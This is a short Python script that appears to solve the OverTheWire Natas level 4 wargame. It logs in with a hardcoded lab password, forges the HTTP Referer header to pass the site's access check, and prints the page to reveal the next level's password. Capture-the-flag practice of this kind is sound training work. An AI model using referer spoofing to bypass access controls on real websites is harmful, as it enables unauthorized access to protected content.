import requests
exploit=requests.session()
exploit.auth=('natas4','Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ')
exploit.headers.update({'referer': 'http://natas5.natas.labs.overthewire.org/'})
request=exploit.get('http://natas4.natas.labs.overthewire.org')

#password has been in the source
print(request.text)